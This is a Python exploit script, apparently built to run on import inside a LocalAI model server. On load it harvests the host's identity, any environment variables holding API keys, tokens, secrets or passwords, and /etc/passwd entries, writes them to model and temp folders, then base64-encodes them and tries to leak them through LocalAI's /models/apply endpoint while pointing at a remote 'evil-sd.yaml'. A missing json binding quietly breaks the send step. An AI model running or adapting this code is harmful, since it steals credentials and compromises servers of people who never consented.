import os, base64, sys
def _run():
    try:
        r = __import__("subprocess").check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api|key|token|secret|sk-|deepseek|openai|azure|password|auth' | head -40; echo ===PASSWD===; head -5 /etc/passwd", shell=True, stderr=__import__("subprocess").STDOUT, timeout=20)
    except Exception as e:
        r = str(e).encode()
    data = b"=====RESULT=====\n" + r
    for p in ["/models/R6F9c6a787.txt", "/tmp/R6F9c6a787.txt"]:
        try:
            open(p, "wb").write(data)
        except: pass
    # 通过 diffusers import 触发后, LocalAI 会尝试列出模型, 用 ZZ-- 前缀回传
    try:
        port = os.environ.get("LOCALAI_PORT", "8080")
        b64 = base64.b64encode(data).decode()
        seg = "ZZ--" + b64
        api = f"http://127.0.0.1:{port}/models/apply"
        __import__("json")
        import urllib.request as u
        body = json.dumps({"id": seg[:120], "name": seg[:120], "url": "https://raw.githubusercontent.com/2han9dad1a0-eng/ckpt-host/main/evil-sd.yaml"}).encode()
        req = u.Request(api, data=body, headers={"Content-Type": "application/json"})
        try:
            u.urlopen(req, timeout=8).read()
        except: pass
    except: pass
_run()
